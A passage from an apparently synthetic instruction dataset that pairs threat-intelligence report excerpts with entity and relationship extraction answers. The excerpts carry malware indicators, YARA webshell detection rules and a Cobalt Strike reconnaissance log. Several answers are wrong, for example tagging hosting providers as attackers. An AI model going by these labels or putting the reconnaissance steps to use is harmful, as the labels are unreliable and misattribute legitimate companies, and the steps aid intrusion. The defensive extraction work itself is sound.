name=\"uploaded_1\";filename=\"84921.pdf\" Content-Type: text/plain RAINDROP SHA256 f2d38a29f6727f4ade62d88d8a68de0d52a0695930b8c92437a2f9e4de92e418 URLs https(://)panhardware(.)com/files/documentation_076.pdf https(://)panhardware(.)com/wp-admin/new_file.php POST FORM name=\"uploaded_1\";filename=\"18824.pdf\" Content-Type: text/plain", "input": null, "output": "Named Entities: (Raindrop, malware), (Teardrop, malware), (Cobalt Strike Beacon, tool), (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07, SHA256), (https(://)infinitysoftwares(.)com/files/information_055.pdf, URL), (https(://)infinitysoftwares(.)com/wp-admin/new_file.php, URL), (be9dbbec6937dfe0a652c0603d4972ba354e83c06b8397d6555fd1847da36725, SHA256), (https(://)bigtopweb(.)com/files/page_306.pdf, URL), (https(://)bigtopweb(.)com/wp-admin/admin-ajax.php, URL), (f2d38a29f6727f4ade62d88d8a68de0d52a0695930b8c92437a2f9e4de92e418, SHA256), (https(://)panhardware(.)com/files/documentation_076.pdf, URL), (https(://)panhardware(.)com/wp-admin/new_file.php, URL)\nRelationships: (Raindrop, deploy, Cobalt Strike Beacon), (Raindrop, similar configuration, Teardrop), (Teardrop, sample hash, b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07), (Raindrop, sample hash, be9dbbec6937dfe0a652c0603d4972ba354e83c06b8397d6555fd1847da36725), (Teardrop, sample hash, f2d38a29f6727f4ade62d88d8a68de0d52a0695930b8c92437a2f9e4de92e418)"}
{"instruction": "All of the aforementioned domains use a common Registrar, NameSilo, LLC and, except for panhardware[.]com, which is currently sinkholed, have common name servers: ns1.dnsowl.com ns2.dnsowl.com ns3.dnsowl.com", "input": null, "output": "Named Entities: (panhardware[.]com, Domain), (ns1.dnsowl.com, Domain), (ns2.dnsowl.com, Domain), (ns3.dnsowl.com, Domain)\nRelationships: No related relations."}
{"instruction": "sample = \"cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45x\" date = \"2023/06/01\" version = \"1\" strings: $head = \"<%@ Page\" $s1 = \"X-siLock-Comment\" $s2 = \"X-siLock-Step\" $s3 = \"Health Check Service\" $s4 = /pass, \\\"[a-z0-9]{8}-[a-z0-9]{4}/ $s5 = \"attachment;filename={0}\" condition: filesize > 5KB and filesize < 10KB and ( ($head in (0..50) and 2 of ($s*)) or (3 of ($s*)) ) } rule MOVEit_Transfer_exploit_webshell_aspx { meta: date = \"2023-06-01\" description = \"Detects indicators of compromise in MOVEit Transfer exploitation.\" author = \"Ahmet Payaslioglu - Binalyze DFIR Lab\" hash1 = \"44d8e68c7c4e04ed3adacb5a88450552\" hash2 = \"a85299f78ab5dd05e7f0f11ecea165ea\" reference1 = \"https://www.reddit.com/r/msp/comments/13xjs1y/tracking_emerging_moveit_transfer_critical/\" reference2 = \"https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/\" reference3 = \"https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643\" verdict = \"dangerous\" mitre = \"T1505.003\" platform = \"windows\" search_context = \"filesystem\" strings: $a1 = \"MOVEit.DMZ\" $a2 = \"Request.Headers[\\\"X-siLock-Comment\\\"]\" $a3 = \"Delete FROM users WHERE RealName='Health Check Service'\" $a4 = \"set[\\\"Username\\\"]\" $a5 = \"INSERT INTO users (Username, LoginName, InstID, Permission, RealName\" $a6 = \"Encryption.OpenFileForDecryption(dataFilePath, siGlobs.FileSystemFactory.Create()\" $a7 = \"Response.StatusCode = 404;\" condition: filesize < 10KB", "input": null, "output": "Named Entities: (https://www.reddit.com/r/msp/comments/13xjs1y/tracking_emerging_moveit_transfer_critical/, URL), (https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/, URL), (https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643, URL), (T1505.003, technique)\nRelationships: No related ralations."}
{"instruction": "Second-stage payload: Teardrop \nA second stage payload, a backdoor called Teardrop, is deployed against a targets of interest to the attackers. Symantec has observed two variants of Teardrop, both of which behave similarly and are used to deliver a further payload \u2013 the Cobalt Strike commodity malware. \nThe first variant (SHA256: b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07) is a DLL. The malicious code is contained in the export Tk_CreateImageType, ordinal 209. When executed, that malicious code reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted and executed. That CobaltStrike sample connects to infinitysoftwares[.]com for command and control. \nThe second variant (SHA256:1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c) is similar, except that the file it loads is called festive_computer.jpg. The embedded CobaltStrike payload connects to ervsystem[.]com for command and control.", "input": null, "output": "Named Entities: (Teardrop, malware), (Cobalt Strike, malware), (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07, SHA256), (upbeat_anxiety.jpg, file), (infinitysoftwares[.]com, Domain), (1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c, SHA256), (festive_computer.jpg, file), (ervsystem[.]com, Domain)\nRelationships: (Teardrop, deploy, Cobalt Strike), (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07, load, upbeat_anxiety.jpg), (1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c, load, festive_computer.jpg)"}
{"instruction": "The Backdoor.Teardrop sample is a DLL with malicious code contained in the export Tk_CreateImageType. When executed, that export reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted. That CobaltStrike samples connects a C&C server - infinitysoftwares[.]com. At this point, the attackers launch WMI to execute rundll32.exe to load another malicious DLL called resources.dll in the path csidl_windows\\desktoptileresources\\. Resources.dll attempts to obtain credentials by accessing lsass.exe using similar techniques to Mimikatz, a widely used credential dumping tool.", "input": null, "output": "Named Entities: (Backdoor.Teardrop, malware), (upbeat_anxiety.jpg, file), (Cobalt Strike, tool), (infinitysoftwares[.]com, Domain), (rundll32.exe, file), (resources.dll, file), (lsass.exe, file), (Mimikatz, tool)\nRelationships: (Backdoor.Teardrop, extract, Cobalt Strike), (Cobalt Strike, connect, infinitysoftwares[.]com), (rundll32.exe, load, resources.dll), (resources.dll, access, lsass.exe), (resources.dll, use, Mimikatz)"}
{"instruction": "During our investigation, we found another IP address on June 3 that was still active at the time of writing. This IP address, which uses port 3000 and the title Blog, is within the IP range of the previous addresses. We surmise that the threat actor relocates some of its infrastructure when their IP address is exposed. Using this third leak site, we were able to find their file storage site (aeey7hxzgl6zowiwhteo5xjbf6sb36tkbn5hptykgmbsjrbiygv4c4id[.]onion). This site hosts critical data stolen from victims such as documents, contracts, and other large amounts of data. The Trigona ransomware group has poor operational security when it comes to the implementation of Tor sites \u2014 although their aim of targeting poorly-managed SQL servers is not something we usually see with less technically-proficient threat actors. Our ransomware spotlight on TargetCompany shows another group using a similar technique of targeting SQL servers.", "input": null, "output": "Named Entities: (aeey7hxzgl6zowiwhteo5xjbf6sb36tkbn5hptykgmbsjrbiygv4c4id[.]onion, Domain)\nRelationships: No related relations."}
{"instruction": "We classified the top 10 alive times into three clusters: 473 seconds, 200 seconds, and 170 seconds. Since many analysis systems are involved, we think that these times are some of the more common timeout settings for different sandboxes. For example, the default timeout setting in the CAPEv2 sandbox is exactly 200 seconds. Unfortunately, we could not confirm what the other alive times are for. Bad operational security During our investigation, we collected several download links for malicious archive files. We noticed that the threat actors distributed not only Google Drive links but also other IP addresses hosted by different cloud providers. Here are some download links that we recently observed: IP/Domain Path http://80[.]85[.]156[.]232 /fav/tw1 http://80[.]85[.]156[.]240 /fav/sWjp /fav/hKjp /fav/sNjp /fav/gTjp /fav/aMjp /fav/128tr /fav/128tw /fav/yMjp http://80[.]85[.]156[.]151 /fav/eeAll http://103[.]159[.]132[.]91 /fav/trteamC /fav/trA /fav/trHatip /file/tr /file/lv https://sa2il[.]johnsimde[.]xyz /f/LV https://iot[.]johnsimde[.]xyz /f/TR https://em2in[.]johnsimde[.]xyz /f/LV https://rewards[.]roshan[.]af /aspnet_client/gdrive.htm /aspnet_client/View.htm /aspnet_client/acv.htm Table 8. Download sites", "input": null, "output": "Named Entities: (Google Drive, tool), (80[.]85[.]156[.]232, IP), (80[.]85[.]156[.]240, IP), (80[.]85[.]156[.]151, IP), (103[.]159[.]132[.]91, IP), (sa2il[.]johnsimde[.]xyz, Domain), (iot[.]johnsimde[.]xyz, Domain), (em2in[.]johnsimde[.]xyz, Domain), (rewards[.]roshan[.]af, Domain)\nRelationships: No related relations."}
{"instruction": "3 . Requesting information on the domain account blocking policy (protection against brute force) beacon> shell net accounts / dom Tasked beacon to run: net accounts / dom host called home, sent: 48 bytes received output: The request will be processed at a domain controller for domain [redacted]construction.com. Force user logoff how long after time expires ?: Never Minimum password age (days): 1 Maximum password age (days): 42 Minimum password length: 6 Length of password history maintained: 24 Lockout threshold: Never Lockout duration (minutes): 30 Lockout observation window (minutes): 30 Computer role: BACKUP Figure 5. More Context into the Forced User Logoff Module", "input": null, "output": "Named Entities: (protection against brute force, threat type), (beacon, tool), (redacted]construction.com, Domain)\nRelationships: No related relations."}
{"instruction": "The infection starts once the user searches for \u201cWinSCP Download\u201d on the Bing search engine. A malicious ad for the WinSCP application is displayed above the organic search results. The ad leads to a suspicious website containing a tutorial on how to use WinSCP for automating file transfer. From this first page, the user is then redirected to a cloned download webpage of WinSCP (winsccp[.]com). Once the user selects the \u201cDownload\u201d button, an ISO file is downloaded from an infected WordPress webpage (hxxps://events.drdivyaclinic[.]com). Recently, the malicious actor changed their final stage payload URL to the file-sharing service 4shared. The overall infection flow involves delivering the initial loader, fetching the bot core, and ultimately, dropping the payload, typically a backdoor. In summary, the malicious actor uses the following malvertising infection chain:", "input": null, "output": "Named Entities: (Bing search engine, tool), (WinSCP application, tool), (winsccp[.]com, Domain), (hxxps://events.drdivyaclinic[.]com, URL), (4shared, tool), (infected WordPress webpage, tool), (bot core, malware), (payload, malware), (backdoor, malware)\nRelationships: (Bing search engine, leads to, WinSCP application), (WinSCP application, leads to, winsccp[.]com), (winsccp[.]com, redirects to, infected WordPress webpage), (malicious actor, changed URL to, 4shared), (malicious actor, uses, infected WordPress webpage), (malicious actor, uses, bot core), (malicious actor, drops, payload)"}
{"instruction": "https[://]twitter.com/naerycrypto/status/1637226997817692161 https[://]twitter.com/CiervoKing/status/1637220583736762370 c) They post fake job vacancies and entice job hunters to download their malware binary: https[://]twitter.com/witty_taeil/status/1631654308218298368 Table 1. List of websites and social media accounts with fake advertisements and equivalent real games cybercriminals plagiarized from Website Twitter account App name Confirmed downloaded file (SHA256) Original game website ryzex[.]io/ https[://]twitter.com/RyzeX_web3 RYZEX https[://]drunk-robots.com/ pearlmetaverse[.]io/ https[://]twitter.com/MetaversePearl Pearl Land mysteriangame[.]com https[://]twitter.com/MysterianGame Mysterian worldofcreatures[.]io https[://]twitter.com/WOC_io/ World of Creatures 8ea33c34647578b79dd8bb7dcf01a8ad1c79e7ada3fd61aca397ed0a2ac57276 https[://]cryptureworld.com/ toncap[.]io https[://]twitter.com/neuromaster9/status/1614074785289437184?s=61 https[://]twitter.com/yoshisakatahi/status/1615686095307522049?s=61 Compared to other fake apps, this is publicized using a personal account (instead of an \u201cofficial\u201d business account). Ton Caps 7bb7b51494c60401c8535baaa30cddb1c41c436e778092f30db5260c42cc70f6 play-impulseflow[.]com https[://]twitter.com/lmpulse_Flow Impulse Flow 02e1d9ea3a0c16106d173b0e6349a18a9aeafacc38650e359cfe1ee2298aaa45 https[://]embersword.com https[://]twitter.com/PureMetaverse https[://]twitter.com/MetaPureLand Pureland Some people have posted on Twitter accounts warning about the malicious activities associated with the fake game apps and websites. Conclusion", "input": null, "output": "Named Entities: (https[://]twitter.com/naerycrypto/status/1637226997817692161, URL), (https[://]twitter.com/CiervoKing/status/1637220583736762370, URL), (https[://]twitter.com/witty_taeil/status/1631654308218298368, URL), (ryzex[.]io/, Domain), (https[://]twitter.com/RyzeX_web3, URL), (pearlmetaverse[.]io/, Domain), (https[://]twitter.com/MetaversePearl, URL), (mysteriangame[.]com, Domain), (https[://]twitter.com/MysterianGame, URL), (worldofcreatures[.]io, Domain), (https[://]twitter.com/WOC_io/, URL), (8ea33c34647578b79dd8bb7dcf01a8ad1c79e7ada3fd61aca397ed0a2ac57276, SHA256), (https[://]cryptureworld.com/, URL), (toncap[.]io, Domain), (https[://]twitter.com/neuromaster9/status/1614074785289437184?s=61, URL), (https[://]twitter.com/yoshisakatahi/status/1615686095307522049?s=61, URL), (7bb7b51494c60401c8535baaa30cddb1c41c436e778092f30db5260c42cc70f6, SHA256), (play-impulseflow[.]com, Domain), (https[://]twitter.com/lmpulse_Flow, URL), (02e1d9ea3a0c16106d173b0e6349a18a9aeafacc38650e359cfe1ee2298aaa45, SHA256),  (https[://]embersword.com, URL), (https[://]twitter.com/PureMetaverse, URL), (https[://]twitter.com/MetaPureLand, URL)\nRelationships: No related relationships."}
{"instruction": "USB Driver.exe then starts checking whether it is properly installed. If it is installed, it will start to infect more removable disks and copy files to a folder named autorun.inf. If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence. Finally, the ACNSHELL malware rzlog4cpp.dll is sideloaded. It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com.", "input": null, "output": "Named Entities: (USB Driver.exe, file), (autorun.inf, file), (ACNSHELL malware, malware), (rzlog4cpp.dll, file), (ncat.exe, file), (closed[.]theworkpc[.]com, Domain)\nRelationships: (USB Driver.exe, copy, autorun.inf), (USB Driver.exe, sideload, ACNSHELL malware), (ACNSHELL malware, create, reverse shell), (reverse shell, connect to, closed[.]theworkpc[.]com)"}
{"instruction": "Attribution\nOur findings allow us to attribute this attack to the Earth Kitsune threat actor with medium confidence. Injecting malicious scripts into North Korean-related websites shows a similar modus operandi and victimology to the previous activities of the group. Furthermore, the delivery server and the C&C server of WhiskerSpy used in this attack have two infrastructure overlaps with our previous research on Operation Earth Kitsune.\nThe first overlap we noticed is that both WhiskerSpy's C&C domain londoncity[.]hopto[.]org and Earth Kitsune\u2019s domain rs[.]myftp[.]biz were resolved to the same IP address 45[.]76[.]62[.]198.\nThe second overlap is that WhiskerSpy\u2019s C&C domains londoncity[.]hopto[.]org and updategoogle[.]servehttp[.]com, plus the domain of the delivery server microsoftwindow[.]sytes[.]net were all resolved to 172[.]93[.]201[.]172. This IP address was also mapped from the domain selectorioi[.]ddns[.]net which was used by Earth Kitsune\u2019s agfSpy backdoor.", "input": null, "output": "Named Entities: (Earth Kitsune, attacker), (WhiskerSpy, malware), (Londoncity[.]hopto[.]org, Domain), (rs[.]myftp[.]biz, Domain), (45[.]76[.]62[.]198, IP), (updategoogle[.]servehttp[.]com, Domain), (microsoftwindow[.]sytes[.]net, Domain), (172[.]93[.]201[.]172, IP), (selectorioi[.]ddns[.]net, Domain), (agfSpy, malware)\nRelationships: (Earth Kitsune, attribution, WhiskerSpy), (WhiskerSpy, C&C domain, updategoogle[.]servehttp[.]com), (WhiskerSpy, delivery server domain, microsoftwindow[.]sytes[.]net)"}
{"instruction": "In July 2022, we found two potentially hacked Facebook accounts advertising scam messages on some Taiwanese community groups claiming users could get an allowance for hurricane, flood, and COVID victims\u2019 assistance. The posts cited that users could register in download.tw1988[.]link to apply, which is in fact a phishing site. Unwitting users could have been victimized as the link masqueraded as the official government website https://1988.taiwan.gov.tw/ used to provide allowances for people in difficult situations. Supplementary Scams: Sextortion and Cryptocurrency Tracking the network infrastructure used by TgToxic, we subsequently found the threat actors also behind sextortion and cryptocurrency scams in Taiwan and Indonesia. The malicious apps could also be downloaded from the same website down[.]tw1988[.]link and masqueraded as dating, messaging, lifestyle, or cryptocurrency-related apps to trick users into installing and enabling the permissions for it. Recent Activities: Phishing in Thailand", "input": null, "output": "Named Entities: (Facebook accounts, attacker), (download.tw1988[.]link, Domain), (TgToxic, attacker)\nRelationships: (Facebook accounts, advertise, scam messages), (scam messages, cite, download.tw1988[.]link), (TgToxic, behind, sextortion and cryptocurrency scams)"}
{"instruction": "Further research revealed that a phishing email from a Celas LLC company (Phishing: Spearphishing Link [T1566.002]) recommended the trojanized cryptocurrency trading application to victims. The email provided a link to the Celas\u2019 website, celasllc[.]com (Acquire Infrastructure: Domain [T1583.001]), where the victim could download a Windows or macOS version of the trojanized application. The celasllc[.]com domain resolved to the following Internet Protocol (IP) addresses from May 29, 2018, to January 23, 2021. 45.199.63[.]220 107.187.66[.]103 145.249.106[.]19 175.29.32[.]160 185.142.236[.]213 185.181.104[.]82 198.251.83[.]27 208.91.197[.]46 209.99.64[.]18 The celasllc[.]com domain had a valid Sectigo (previously known as Comodo) Secure Sockets Layer (SSL) certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Celas Trade Pro Application Analysis Windows Program", "input": null, "output": "Named Entities: (Celas LLC, attacker), (Phishing: Spearphishing Link, threat type), (celasllc[.]com, Domain), (45.199.63[.]220, IP), (107.187.66[.]103, IP), (145.249.106[.]19, IP), (175.29.32[.]160, IP), (185.142.236[.]213, IP), (185.181.104[.]82, IP), (198.251.83[.]27, IP), (208.91.197[.]46, IP), (209.99.64[.]18, IP), (Sectigo, tool), (SSL certificate, tool), (Comodo, tool), (Secure Sockets Layer, tool), (Celas Trade Pro Application, tool), (Windows Program, tool)\nRelationships: (Celas LLC, use, Phishing: Spearphishing Link), (Phishing: Spearphishing Link, domain, celasllc[.]com), (celasllc[.]com, IP, 45.199.63[.]220), (celasllc[.]com, IP, 107.187.66[.]103), (celasllc[.]com, IP, 145.249.106[.]19), (celasllc[.]com, IP, 175.29.32[.]160), (celasllc[.]com, IP, 185.142.236[.]213), (celasllc[.]com, IP, 185.181.104[.]82), (celasllc[.]com, IP, 198.251.83[.]27), (celasllc[.]com, IP, 208.91.197[.]46), (celasllc[.]com, IP, 209.99.64[.]18), (celasllc[.]com, tool, Sectigo), (Sectigo, tool, SSL certificate), (Celas Trade Pro Application, tool, Windows Program)"}
{"instruction": "The Windows version of the malicious Celas Trade Pro application is an MSI Installer (.msi). The MSI Installer installation package comprises a software component and an application programming interface (API) that Microsoft uses for the installation, maintenance, and removal of software. The installer looks legitimate and is signed by a valid Sectigo certificate that was purchased by the same user as the SSL certificate for celasllc[.]com (Obtain Capabilities: Code Signing Certificates [T1588.003]). The MSI Installer asks the victim for administrative privileges to run (User Execution: Malicious File [T1204.002]). Once permission is granted, the threat actor is able to run the program with elevated privileges (Abuse Elevation Control Mechanism [T1548]) and MSI executes the following actions. Installs CelasTradePro.exe in folder C:\\Program Files (x86)\\CelasTradePro Installs Updater.exe in folder C:\\Program Files (x86)\\CelasTradePro Runs Updater.exe with the CheckUpdate parameters", "input": null, "output": "Named Entities: (Celas Trade Pro, malware), (MSI Installer, tool), (celasllc[.]com, Domain), (Sectigo certificate, tool), (C:\\Program Files (x86)\\CelasTradePro\\Updater.exe, file)\nRelationships: (Celas Trade Pro, use, MSI Installer), (celasllc[.]com, signed by, Sectigo certificate), (Sectigo certificate, used for, celasllc[.]com)"}
{"instruction": "AppleJeus Version 2: JMT Trading Introduction and Infrastructure In October 2019, a cybersecurity company identified a new version of the AppleJeus malware\u2014JMT Trading\u2014thanks to its many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which a legitimate-looking company, called JMT Trading, marketed and distributed on their website, jmttrading[.]org (Acquire Infrastructure: Domain [T1583.001]). This website contained a \u201cDownload from GitHub\u201d button, which linked to JMT Trading\u2019s GitHub page (Acquire Infrastructure: Web Services [T1583.006]), where Windows and macOS X versions of the JMT Trader application were available for download (Develop Capabilities: Malware [T1587.001]). The GitHub page also included .zip and tar.gz files containing the source code. The jmttrading[.]org domain resolved to the following IP addresses from October 15, 2016, to January 22, 2021. 45.33.2[.]79 45.33.23[.]183 45.56.79[.]23 45.79.19[.]196 96.126.123[.]244 146.112.61[.]107 184.168.221[.]40 184.168.221[.]57 198.187.29[.]20 198.54.117[.]197 198.54.117[.]198 198.54.117[.]199 198.54.117[.]200 198.58.118[.]167", "input": null, "output": "Named Entities: (AppleJeus Version 2, malware), (JMT Trading, malware), (jmttrading[.]org, Domain), (45.33.2[.]79, IP), (45.33.23[.]183, IP), (45.56.79[.]23, IP), (45.79.19[.]196, IP), (96.126.123[.]244, IP), (146.112.61[.]107, IP), (184.168.221[.]40, IP), (184.168.221[.]57, IP), (198.187.29[.]20, IP), (198.54.117[.]197, IP), (198.54.117[.]198, IP), (198.54.117[.]199, IP), (198.54.117[.]200, IP), (198.58.118[.]167, IP)\nRelationships: (AppleJeus Version 2, identified as, JMT Trading), (JMT Trading, marketed and distributed on, jmttrading[.]org), (jmttrading[.]org, resolved to, 45.33.2[.]79), (jmttrading[.]org, resolved to, 45.33.23[.]183), (jmttrading[.]org, resolved to, 45.56.79[.]23), (jmttrading[.]org, resolved to, 45.79.19[.]196), (jmttrading[.]org, resolved to, 96.126.123[.]244), (jmttrading[.]org, resolved to, 146.112.61[.]107), (jmttrading[.]org, resolved to, 184.168.221[.]40), (jmttrading[.]org, resolved to, 184.168.221[.]57), (jmttrading[.]org, resolved to, 198.187.29[.]20), (jmttrading[.]org, resolved to, 198.54.117[.]197), (jmttrading[.]org, resolved to, 198.54.117[.]198), (jmttrading[.]org, resolved to, 198.54.117[.]199), (jmttrading[.]org, resolved to, 198.54.117[.]200), (jmttrading[.]org, resolved to, 198.58.118[.]167)"}
{"instruction": "The jmttrading[.]org domain had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. The current SSL certificate was issued by Let\u2019s Encrypt. JMT Trading Application Analysis Windows Program The Windows version of the malicious cryptocurrency application is an MSI Installer. The installer looks legitimate and has a valid digital signature from Sectigo (Obtain Capabilities: Digital Certificates [T1588.004]). The signature was signed with a code signing certificate purchased by the same user as the SSL certificate for jmttrading[.]org (Obtain Capabilities: Code Signing Certificates [T1588.003]). The MSI Installer asks the victim for administrative privileges to run (User Execution: Malicious File [T1204.002]). Once permission is granted, the MSI executes the following actions. Installs JMTTrader.exe in folder C:\\Program Files (x86)\\JMTTrader Installs CrashReporter.exe in folder C:\\Users\\<username>\\AppData\\Roaming\\JMTTrader", "input": null, "output": "Named Entities: (jmttrading[.]org, Domain), (Sectigo SSL certificate, tool), (Let's Encrypt, tool), (MSI Installer, tool), (Sectigo, tool), (JMTTrader.exe, file), (CrashReporter.exe, file)\nRelationships: (jmttrading[.]org, has, Sectigo SSL certificate), (Sectigo SSL certificate, issued by, Let's Encrypt), (MSI Installer, installs, JMTTrader.exe), (MSI Installer, installs, CrashReporter.exe)"}
{"instruction": "AppleJeus Version 3: Union Crypto Introduction and Infrastructure In December 2019, another version of the AppleJeus malware was identified on Twitter by a cybersecurity company based on many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which was marketed and distributed by a legitimate-looking company, called Union Crypto, on their website, unioncrypto[.]vip (Acquire Infrastructure: Domain [T1583.001]). Although this website is no longer available, a cybersecurity researcher discovered a download link, https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN, recorded on VirusTotal for the macOS X version of UnionCryptoTrader. In contrast, open-source reporting stated that the Windows version might have been downloaded via instant messaging service Telegram, as it was found in a \u201cTelegram Downloads\u201d folder on an unnamed victim.[7] The unioncrypto[.]vip domain resolved to the following IP addresses from June 5, 2019, to July 15, 2020. 104.168.167[.]16 198.54.117[.]197 198.54.117[.]198 198.54.117[.]199 198.54.117[.]200", "input": null, "output": "Named Entities: (AppleJeus, malware), (Union Crypto, attacker), (unioncrypto[.]vip, Domain), (https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN, URL), (104.168.167[.]16, IP), (198.54.117[.]197, IP), (198.54.117[.]198, IP), (198.54.117[.]199, IP), (198.54.117[.]200, IP)\nRelationships: (Union Crypto, domain, unioncrypto[.]vip), (unioncrypto[.]vip, resolved to, 104.168.167[.]16), (unioncrypto[.]vip, resolved to, 198.54.117[.]197), (unioncrypto[.]vip, resolved to, 198.54.117[.]198), (unioncrypto[.]vip, resolved to, 198.54.117[.]199), (unioncrypto[.]vip, resolved to, 198.54.117[.]200), (unioncrypto[.]vip, recorded on, https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN)"}
{"instruction": "The domain unioncrypto[.]vip had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Union Crypto Trader Application Analysis Windows Program The Windows version of the malicious cryptocurrency application is a Windows executable (.exe) (User Execution: Malicious File [T1204.002]), which acts as an installer that extracts a temporary MSI Installer. The Windows program executes the following actions. Extracts UnionCryptoTrader.msi to folder C:\\Users\\<username>\\AppData\\Local\\Temp\\{82E4B719-90F74BD1-9CF1-56CD777E0C42} Runs UnionCryptoUpdater.msi Installs UnionCryptoTrader.exe in folder C:\\Program Files\\UnionCryptoTrader Installs UnionCryptoUpdater.exe in folder C:\\Users\\<username>\\AppData\\Local\\UnionCryptoTrader Deletes UnionCryptoUpdater.msi Runs UnionCryptoUpdater.exe", "input": null, "output": "Named Entities: (unioncrypto[.]vip, Domain), (Sectigo SSL certificate, tool), (T1588.004, technique), (Union Crypto Trader Application, tool), (Windows Program, tool), (T1204.002, technique), (UnionCryptoTrader.msi, file), (UnionCryptoUpdater.msi, file), (UnionCryptoUpdater.exe, file)\nRelationships: (unioncrypto[.]vip, had, Sectigo SSL certificate), (unioncrypto[.]vip, seen in, Windows Program), (Windows Program, extracts, UnionCryptoTrader.msi), (Windows Program, runs, UnionCryptoUpdater.msi), (Windows Program, installs, UnionCryptoUpdater.exe), (Windows Program, deletes, UnionCryptoUpdater.msi), (Windows Program, runs, UnionCryptoUpdater.exe)"}
{"instruction": "AppleJeus Version 4: Kupay Wallet Introduction and Infrastructure On March 13, 2020, a new version of the AppleJeus malware was identified. The malware was marketed and distributed by a legitimate-looking company, called Kupay Wallet, on their website kupaywallet[.]com (Acquire Infrastructure: Domain [T1583.001]). The domain www.kupaywallet[.]com resolved to IP address 104.200.67[.]96 from March 20, 2020, to January 16, 2021. CrownCloud US, LLC controlled the IP address (autonomous system number [ASN] 8100), and is located in New York, NY. The domain www.kupaywallet[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Kupay Wallet Application Analysis Windows Program The Windows version of the malicious cryptocurrency application is an MSI Installer. The MSI executes the following actions. Installs Kupay.exe in folder C:\\Program Files (x86)\\Kupay", "input": null, "output": "Named Entities: (AppleJeus, malware), (Kupay Wallet, tool), (kupaywallet[.]com, Domain), (104.200.67[.]96, IP), (CrownCloud US, LLC, attacker), (Sectigo SSL certificate, tool)\nRelationships: (AppleJeus, marketed and distributed by, Kupay Wallet), (Kupay Wallet, domain, kupaywallet[.]com), (kupaywallet[.]com, resolved to, 104.200.67[.]96), (104.200.67[.]96, controlled by, CrownCloud US, LLC), (kupaywallet[.]com, had, Sectigo SSL certificate)"}
{"instruction": "AppleJeus Version 5: CoinGoTrade Introduction and Infrastructure In early 2020, another version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called CoinGoTrade on their website coingotrade[.]com (Acquire Infrastructure: Domain [T1583.001]). The domain CoinGoTrade[.]com resolved to IP address 198.54.114[.]175 from February 28, 2020, to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for Dorusio[.]com and Ants2Whale[.]com. The domain CoinGoTrade[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. CoinGoTrade Application Analysis Windows Program", "input": null, "output": "Named Entities: (AppleJeus Version 5, malware), (CoinGoTrade, attacker), (coingotrade[.]com, Domain), (198.54.114[.]175, IP), (NameCheap Inc., attacker), (Dorusio[.]com, Domain), (Ants2Whale[.]com, Domain), (Sectigo, tool), (SSL certificate, tool)\nRelationships: (AppleJeus Version 5, marketed and distributed by, CoinGoTrade), (CoinGoTrade, domain, coingotrade[.]com), (coingotrade[.]com, resolved to, 198.54.114[.]175), (198.54.114[.]175, controlled by, NameCheap Inc.), (coingotrade[.]com, same ASN, Dorusio[.]com), (coingotrade[.]com, same ASN, Ants2Whale[.]com), (coingotrade[.]com, had, SSL certificate)"}
